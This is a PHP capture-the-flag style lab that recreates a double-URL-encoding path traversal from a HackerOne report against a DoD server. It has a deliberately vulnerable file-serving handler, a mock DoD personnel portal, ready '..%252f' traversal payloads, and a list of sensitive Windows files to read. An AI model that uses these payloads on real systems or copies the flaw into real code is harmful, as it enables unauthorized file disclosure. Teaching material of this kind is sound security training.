<?php
// LFI Lab 128 — DoD GWT CSS Servlet — Double URL Encoding Path Traversal
// HackerOne Report #497771 (High — U.S. Dept of Defense, Windows server)
// Endpoint: GET ?path={resource}
// Bypass: ..%252f  →  first decode: ..%2f  →  second urldecode: ../

// ── Path normalizer ────────────────────────────────────────────────────────
function normalizePath($path) {
    // Normalize both / and \ (Windows paths)
    $path  = str_replace('\\', '/', $path);
    $parts = explode('/', $path);
    $stack = [];
    foreach ($parts as $part) {
        if ($part === '' || $part === '.') continue;
        if ($part === '..') {
            if (!empty($stack)) array_pop($stack);
        } else {
            $stack[] = $part;
        }
    }
    return '/' . implode('/', $stack);
}

// ── Request handler ────────────────────────────────────────────────────────
$path = isset($_GET['path']) ? $_GET['path'] : null;

if ($path !== null) {
    // ── Step 1: PHP auto-decodes the query string once (e.g. %25 → %)
    // $path already has one decode applied by PHP's query string parser.
    // e.g. ..%252f → ..%2f   (slash still encoded — no literal ../ present)

    // ── Filter: block obvious traversal with literal ../ or ..\
    if (strpos($path, '../') !== false || strpos($path, '..\\') !== false
        || strpos($path, '..%5c') !== false || strpos($path, '..%5C') !== false) {
        http_response_code(400);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'Bad Request';
        exit;
    }

    // ── Step 2: BUG — second urldecode (GwtCssServlet internal behaviour)
    // ..%2f  →  ../   (traversal now active)
    $decoded = urldecode($path);

    // ── Detect CSS resource vs traversal for Content-Type
    $isCss = (substr($decoded, -4) === '.css');

    // ── Resolve within fake Windows FS
    $fsRoot     = __DIR__ . '/lab128_fs';
    $normalized = normalizePath($decoded);
    $absPath    = $fsRoot . $normalized;

    if (!file_exists($absPath) || is_dir($absPath)) {
        http_response_code(404);
        header('Content-Type: text/plain; charset=utf-8');
        echo '404 Not Found';
        exit;
    }

    if ($isCss) {
        header('Content-Type: text/css; charset=utf-8');
    } else {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: inline; filename="' . addslashes(basename($absPath)) . '"');
    }
    header('Cache-Control: no-cache');
    readfile($absPath);
    exit;
}

// ── Landing page ───────────────────────────────────────────────────────────
function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DoD Personnel Records System</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:Arial,Helvetica,sans-serif;background:#e8edf2;color:#1a1a2e;font-size:13px;display:flex;flex-direction:column;min-height:100vh;}

/* ── Top strip ───────────────────────────────────────────────────────────── */
.top-strip{background:#061830;color:#6a8aab;font-size:.58rem;padding:3px 16px;text-align:center;letter-spacing:.06em;text-transform:uppercase;}

/* ── Header ──────────────────────────────────────────────────────────────── */
.site-header{background:#0a2240;border-bottom:3px solid #c8a84b;}
.header-inner{max-width:1180px;margin:0 auto;padding:10px 16px;display:flex;align-items:center;gap:12px;}
.dod-seal{width:48px;height:48px;background:radial-gradient(circle,#1a3a60,#061830);border:2px solid #c8a84b;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.dod-seal svg{width:26px;height:26px;fill:#c8a84b;}
.hdr-text{flex:1;}
.hdr-dept{font-size:.6rem;font-weight:700;color:#c8a84b;letter-spacing:.1em;text-transform:uppercase;}
.hdr-title{font-size:1rem;font-weight:700;color:#e8f0f8;margin-top:1px;}
.hdr-sub{font-size:.62rem;color:#5a7a9a;margin-top:1px;}
.hdr-right{text-align:right;}
.hdr-user{font-size:.72rem;font-weight:700;color:#c8a84b;}
.hdr-machine{font-size:.62rem;color:#5a7a9a;margin-top:2px;}

/* ── Nav ─────────────────────────────────────────────────────────────────── */
.site-nav{background:#061830;border-bottom:1px solid #0f2a48;}
.nav-inner{max-width:1180px;margin:0 auto;display:flex;}
.nav-a{font-size:.71rem;font-weight:700;color:#6a8aab;padding:8px 13px;text-decoration:none;border-bottom:2px solid transparent;transition:all .13s;letter-spacing:.02em;}
.nav-a:hover{color:#c9cdd4;background:#0a1e38;}
.nav-a.active{color:#c8a84b;border-bottom-color:#c8a84b;}

/* ── Layout ──────────────────────────────────────────────────────────────── */
.wrap{max-width:1180px;margin:0 auto;padding:16px;flex:1;display:grid;grid-template-columns:1fr 270px;gap:14px;}

/* ── Panel ───────────────────────────────────────────────────────────────── */
.panel{background:#fff;border:1px solid #c8d6e4;border-radius:2px;overflow:hidden;margin-bottom:12px;box-shadow:0 1px 2px rgba(0,0,0,.06);}
.panel-hd{background:#0a2240;color:#e8f0f8;padding:8px 13px;display:flex;align-items:center;gap:7px;font-size:.75rem;font-weight:700;}
.panel-hd-icon{width:14px;height:14px;fill:#c8a84b;}
.panel-hd-sub{font-size:.6rem;color:#4a7a9a;margin-left:auto;font-weight:400;}
.panel-bd{padding:13px;}

/* ── Welcome banner ──────────────────────────────────────────────────────── */
.welcome-banner{background:#f0f4f8;border:1px solid #c8d6e4;border-left:4px solid #0a2240;padding:11px 14px;margin-bottom:12px;display:flex;align-items:center;gap:12px;}
.welcome-text{font-size:.8rem;font-weight:700;color:#0a2240;}
.welcome-sub{font-size:.68rem;color:#5a7a9a;margin-top:2px;}
.win-info{display:flex;gap:16px;margin-left:auto;flex-wrap:wrap;}
.win-badge{font-size:.65rem;background:#0a2240;color:#c8a84b;padding:2px 8px;border-radius:2px;font-weight:700;white-space:nowrap;}

/* ── Servlet info ────────────────────────────────────────────────────────── */
.servlet-box{background:#f7f9fb;border:1px solid #c8d6e4;border-radius:2px;padding:12px 13px;margin-bottom:10px;}
.servlet-title{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#3a5a7a;margin-bottom:8px;padding-bottom:4px;border-bottom:2px solid #c8a84b;}

/* ── URL display ─────────────────────────────────────────────────────────── */
.url-block{background:#1a1a2e;border-radius:3px;padding:11px 13px;font-family:'Courier New',monospace;font-size:.69rem;line-height:2;word-break:break-all;margin-bottom:10px;}
.u-comment{color:#555;font-style:italic;}
.u-host{color:#81c784;}
.u-path{color:#aaa;}
.u-servlet{color:#ffb74d;}
.u-double{color:#f48fb1;font-weight:700;}
.u-file{color:#80deea;}
.u-ok{color:#4fc3f7;}
.u-blocked{color:#ef9a9a;}

/* ── Encode steps ────────────────────────────────────────────────────────── */
.steps{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:10px;}
.step{background:#f0f4f8;border:1px solid #c8d6e4;border-radius:2px;padding:9px 10px;text-align:center;}
.step-num{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#3a5a7a;margin-bottom:4px;}
.step-val{font-family:monospace;font-size:.72rem;font-weight:700;}
.step-desc{font-size:.62rem;color:#6a8aab;margin-top:3px;line-height:1.4;}
.step-arrow{display:flex;align-items:center;justify-content:center;font-size:1.1rem;color:#c8a84b;font-weight:700;padding-top:18px;}

/* ── Request builder ─────────────────────────────────────────────────────── */
.req-form{background:#f7f9fb;border:1px solid #c8d6e4;border-radius:2px;padding:12px;}
.req-label{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#3a5a7a;display:block;margin-bottom:5px;}
.req-urlbar{background:#1a1a2e;border-radius:2px;padding:7px 10px;font-family:monospace;font-size:.69rem;color:#9e9e9e;margin-bottom:8px;word-break:break-all;line-height:1.5;}
.req-urlbar .rv{color:#f48fb1;}
.req-row{display:flex;gap:6px;margin-bottom:6px;}
.req-input{flex:1;border:1px solid #c8d6e4;background:#fff;padding:5px 8px;font-family:monospace;font-size:.73rem;color:#1a1a2e;outline:none;border-radius:2px;}
.req-input:focus{border-color:#0a2240;box-shadow:0 0 0 2px rgba(10,34,64,.1);}
.req-send{background:#0a2240;color:#c8a84b;border:none;padding:5px 14px;font-size:.72rem;font-weight:700;border-radius:2px;cursor:pointer;font-family:inherit;white-space:nowrap;letter-spacing:.03em;}
.req-send:hover{background:#1a3a60;}
.req-note{font-size:.62rem;color:#6a8aab;line-height:1.6;}
.req-note code{background:#e8edf2;padding:1px 4px;border-radius:2px;font-size:.62rem;color:#0a2240;border:1px solid #c8d6e4;}

/* ── Response ────────────────────────────────────────────────────────────── */
.resp-wrap{display:none;margin-top:8px;}
.resp-bar{background:#0a2240;padding:5px 10px;display:flex;align-items:center;gap:8px;font-size:.67rem;border-radius:2px 2px 0 0;}
.resp-200{background:#1b5e20;color:#a5d6a7;padding:1px 7px;border-radius:2px;font-weight:700;}
.resp-400{background:#b71c1c;color:#ef9a9a;padding:1px 7px;border-radius:2px;font-weight:700;}
.resp-404{background:#4e342e;color:#ffcc80;padding:1px 7px;border-radius:2px;font-weight:700;}
.resp-ct{color:#4a7a9a;font-size:.63rem;}
.resp-body{background:#0d1117;border:1px solid #1a2f48;border-top:none;border-radius:0 0 2px 2px;padding:10px;font-family:'Courier New',monospace;font-size:.7rem;color:#a8ff78;line-height:1.55;max-height:360px;overflow:auto;white-space:pre-wrap;word-break:break-all;}
.resp-body.err{color:#ef9a9a;}

/* ── Sidebar ─────────────────────────────────────────────────────────────── */
.sb-card{background:#fff;border:1px solid #c8d6e4;border-radius:2px;overflow:hidden;margin-bottom:10px;box-shadow:0 1px 2px rgba(0,0,0,.05);}
.sb-hd{background:#0a2240;color:#9ac;font-size:.63rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;padding:6px 10px;border-bottom:1px solid #0f2a48;}
.sb-bd{padding:9px 10px;font-size:.71rem;}
.sb-row{display:flex;gap:5px;margin-bottom:3px;}
.sb-lbl{color:#6a8aab;min-width:68px;font-size:.67rem;flex-shrink:0;}
.sb-val{font-weight:700;color:#1a1a2e;font-size:.67rem;word-break:break-all;}
.sb-ok{color:#2d7d32;}
.sb-warn{color:#e65100;}
.module-tag{display:inline-block;background:#e8edf2;border:1px solid #c8d6e4;color:#3a5a7a;font-size:.62rem;padding:1px 6px;border-radius:2px;margin:1px;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
footer{background:#061830;border-top:3px solid #c8a84b;padding:8px 16px;font-size:.6rem;color:#2a4a6a;display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;flex-shrink:0;margin-top:auto;}
footer a{color:#2a4a6a;text-decoration:none;}
footer a:hover{color:#c8a84b;}
</style>
</head>
<body>

<div class="top-strip">U.S. Department of Defense — DoD Personnel Records System — Authorized Access Only</div>

<header class="site-header">
  <div class="header-inner">
    <div class="dod-seal">
      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
    </div>
    <div class="hdr-text">
      <div class="hdr-dept">U.S. Department of Defense</div>
      <div class="hdr-title">DoD Personnel Records System</div>
      <div class="hdr-sub">GWT Framework · IIS 7.5 · Windows Server 2008 R2</div>
    </div>
    <div class="hdr-right">
      <div class="hdr-user">Administrator</div>
      <div class="hdr-machine">DOD-APPSERVER01 · Session Active</div>
    </div>
  </div>
</header>

<nav class="site-nav">
  <div class="nav-inner">
    <a href="128.php" class="nav-a active">Dashboard</a>
    <a href="#" class="nav-a">Personnel</a>
    <a href="#" class="nav-a">Records</a>
    <a href="#" class="nav-a">Reports</a>
    <a href="#" class="nav-a">Admin</a>
  </div>
</nav>

<div class="wrap">

  <!-- Main -->
  <div>

    <!-- Welcome banner -->
    <div class="welcome-banner">
      <svg viewBox="0 0 24 24" style="width:32px;height:32px;fill:#0a2240;flex-shrink:0;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-4H7l5-8v4h4l-5 8z"/></svg>
      <div>
        <div class="welcome-text">Welcome, Administrator</div>
        <div class="welcome-sub">DoD Personnel Records System · GWT 2.8.2 · Apache Tomcat 8.5.38</div>
      </div>
      <div class="win-info">
        <span class="win-badge">Windows Server 2008 R2</span>
        <span class="win-badge">IIS 7.5</span>
        <span class="win-badge">Java 8u201</span>
      </div>
    </div>

    <!-- GWT Servlet info -->
    <div class="panel">
      <div class="panel-hd">
        <svg class="panel-hd-icon" viewBox="0 0 24 24"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
        GWT Static Resource Servlet — <code style="font-size:.72rem;color:#c8a84b;">GwtCssServlet</code>
        <span class="panel-hd-sub">/gwtmain/*</span>
      </div>
      <div class="panel-bd">

        <div class="servlet-box">
          <div class="servlet-title">Servlet Endpoint</div>
          <div class="url-block">
<span class="u-comment">// Normal CSS resource request</span>
<span class="u-host">https://████.mil</span><span class="u-path">/</span><span class="u-servlet">gwtmain</span><span class="u-path">//</span><span class="u-file">module_styles.css</span>   <span style="color:#4caf50;">← 200 text/css</span>

<span class="u-comment">// Double URL encoding bypasses path filter</span>
<span class="u-comment">// Encode: ../ → ..%2f → ..%252f  (encode the % again)</span>
<span class="u-host">https://████.mil</span><span class="u-path">/</span><span class="u-servlet">gwtmain</span><span class="u-path">//</span><span class="u-double">..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f</span><span class="u-file">windows/System32/drivers/etc/hosts</span>
          </div>
        </div>

        <!-- Encoding steps -->
        <div class="servlet-title" style="margin-bottom:8px;">How Double URL Encoding Bypasses the Filter</div>
        <div style="display:grid;grid-template-columns:1fr auto 1fr auto 1fr;gap:4px;margin-bottom:12px;align-items:start;">
          <div class="step">
            <div class="step-num">Attacker sends</div>
            <div class="step-val" style="color:#f48fb1;">..%252f</div>
            <div class="step-desc">% encoded as %25<br>slash still hidden</div>
          </div>
          <div class="step-arrow">→</div>
          <div class="step">
            <div class="step-num">Server decode #1</div>
            <div class="step-val" style="color:#ffb74d;">..%2f</div>
            <div class="step-desc">%25 → %<br>no literal ../ — <strong style="color:#4caf50;">PASSES FILTER</strong></div>
          </div>
          <div class="step-arrow">→</div>
          <div class="step">
            <div class="step-num">Servlet decode #2</div>
            <div class="step-val" style="color:#ef9a9a;">../</div>
            <div class="step-desc">urldecode() %2f → /<br><strong style="color:#ef5350;">TRAVERSAL ACTIVE</strong></div>
          </div>
        </div>

        <!-- Request builder -->
        <div class="req-form">
          <label class="req-label">Send Request to GwtCssServlet</label>
          <div class="req-urlbar">
            <span style="color:#81c784;">https://████.mil</span>/128.php?path=<span class="rv" id="urlVal">inetpub/wwwroot/gwtmain/module_styles.css</span>
          </div>
          <div class="req-row">
            <input type="text" class="req-input" id="reqInput"
                   value="inetpub/wwwroot/gwtmain/module_styles.css"
                   placeholder="path parameter...">
            <button class="req-send" onclick="sendReq()">Send →</button>
          </div>
          <div class="req-note">
            Filter blocks: <code>../</code> (literal) &nbsp;·&nbsp;
            Try double-encoded: <code>..%252f..%252f..%252fwindows/System32/drivers/etc/hosts</code><br>
            Note: Browser address bar auto-decodes — use Burp Suite or the field above for raw %25 sequences.
          </div>

          <div class="resp-wrap" id="respWrap">
            <div class="resp-bar">
              <span id="respStatus"></span>
              <span class="resp-ct" id="respCt"></span>
              <span style="margin-left:auto;font-size:.62rem;color:#2a4a6a;" id="respSize"></span>
            </div>
            <pre class="resp-body" id="respBody"></pre>
          </div>
        </div>

      </div>
    </div>

  </div><!-- end main -->

  <!-- Sidebar -->
  <div>

    <div class="sb-card">
      <div class="sb-hd">Server Status</div>
      <div class="sb-bd">
        <div class="sb-row"><span class="sb-lbl">OS</span><span class="sb-val">Windows Server 2008 R2</span></div>
        <div class="sb-row"><span class="sb-lbl">IIS</span><span class="sb-val">7.5.7600</span></div>
        <div class="sb-row"><span class="sb-lbl">Java</span><span class="sb-val">1.8.0_201</span></div>
        <div class="sb-row"><span class="sb-lbl">Tomcat</span><span class="sb-val">8.5.38</span></div>
        <div class="sb-row"><span class="sb-lbl">GWT</span><span class="sb-val">2.8.2</span></div>
        <div class="sb-row"><span class="sb-lbl">Status</span><span class="sb-val sb-ok">Running</span></div>
        <div class="sb-row"><span class="sb-lbl">Auth</span><span class="sb-val sb-warn">Windows Auth</span></div>
      </div>
    </div>

    <div class="sb-card">
      <div class="sb-hd">Loaded GWT Modules</div>
      <div class="sb-bd">
        <span class="module-tag">gwtmain</span>
        <span class="module-tag">personnel</span>
        <span class="module-tag">records</span>
        <span class="module-tag">reports</span>
        <span class="module-tag">gwt-user</span>
        <div style="font-size:.65rem;color:#6a8aab;margin-top:7px;">CSS served from: <code style="font-size:.62rem;">C:\inetpub\wwwroot\gwtmain\</code></div>
      </div>
    </div>

    <div class="sb-card">
      <div class="sb-hd">About GwtCssServlet</div>
      <div class="sb-bd" style="color:#5a7a9a;line-height:1.7;">
        The <code style="font-size:.65rem;">GwtCssServlet</code> serves static CSS resources for GWT modules. It maps URL paths to files on disk. The servlet applies <code style="font-size:.65rem;">urldecode()</code> internally — creating a second URL decode pass when combined with the web server's decode.
      </div>
    </div>

    <div class="sb-card">
      <div class="sb-hd">Known Files (Windows)</div>
      <div class="sb-bd" style="font-size:.67rem;line-height:2;color:#3a5a7a;">
        <div><code style="font-size:.62rem;">windows/System32/drivers/etc/hosts</code></div>
        <div><code style="font-size:.62rem;">windows/System32/drivers/etc/services</code></div>
        <div><code style="font-size:.62rem;">Users/Administrator/NTUser.dat</code></div>
        <div><code style="font-size:.62rem;">inetpub/wwwroot/WEB-INF/web.xml</code></div>
        <div><code style="font-size:.62rem;">ProgramData/dod_app/config.ini</code></div>
      </div>
    </div>

  </div>

</div><!-- .wrap -->

<footer>
  <span>DoD Personnel Records System v3.4.1 · GWT 2.8.2 · Windows Server 2008 R2 · IIS 7.5</span>
  <span>Based on <a href="https://hackerone.com/reports/497771" target="_blank" rel="noopener">HackerOne #497771</a></span>
</footer>

<script>
var reqInput = document.getElementById('reqInput');
var urlVal   = document.getElementById('urlVal');

reqInput.addEventListener('input', function() {
    urlVal.textContent = reqInput.value;
});

async function sendReq() {
    var path = reqInput.value.trim();
    if (!path) return;

    urlVal.textContent = path;

    // Send the raw value — browser will encode once, PHP will decode once
    // For ..%252f: browser doesn't re-encode % in query strings, so it arrives intact
    var url = '128.php?path=' + path.replace(/\+/g, '%2B');

    var wrap      = document.getElementById('respWrap');
    var statusEl  = document.getElementById('respStatus');
    var ctEl      = document.getElementById('respCt');
    var bodyEl    = document.getElementById('respBody');
    var sizeEl    = document.getElementById('respSize');

    try {
        // Use raw fetch without URL re-encoding the % characters
        var resp = await fetch(url);
        var text = await resp.text();

        wrap.style.display = 'block';
        sizeEl.textContent = text.length + ' bytes';

        if (resp.status === 200) {
            statusEl.className   = 'resp-200';
            statusEl.textContent = 'HTTP 200 OK';
            ctEl.textContent     = resp.headers.get('Content-Type') || '';
            bodyEl.className     = 'resp-body';
        } else if (resp.status === 400) {
            statusEl.className   = 'resp-400';
            statusEl.textContent = 'HTTP 400 Bad Request';
            ctEl.textContent     = 'Filter: ../ detected';
            bodyEl.className     = 'resp-body err';
        } else {
            statusEl.className   = 'resp-404';
            statusEl.textContent = 'HTTP ' + resp.status;
            ctEl.textContent     = '';
            bodyEl.className     = 'resp-body err';
        }
        bodyEl.textContent = text;
    } catch(e) {
        wrap.style.display   = 'block';
        statusEl.className   = 'resp-400';
        statusEl.textContent = 'Error';
        bodyEl.className     = 'resp-body err';
        bodyEl.textContent   = e.message;
    }
}

reqInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') sendReq();
});
</script>

</body>
</html>
